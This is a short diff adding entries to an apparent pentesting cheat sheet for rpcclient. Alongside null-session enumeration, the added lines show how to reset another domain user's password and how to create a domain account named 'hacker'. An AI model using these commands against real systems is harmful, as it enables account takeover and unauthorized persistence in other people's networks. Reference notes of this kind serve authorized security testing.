@@ -160,4 +160,14 @@ rpcclient -U '' <ip>
 > querygroup <group-rid>
 
 rpcclient --user="" --command=enumprivs -N 10.10.10.1
+
+## Change the password of user
+> enumdomusers
+user:[Molly.Smith] rid:[0x453]
+> setuserinfo2 Molly.Smith 24 Password@1
+
+## create new user 
+createdomuser hacker
+setuserinfo2 hacker 24 Password@1
+enumdomusers
 ```
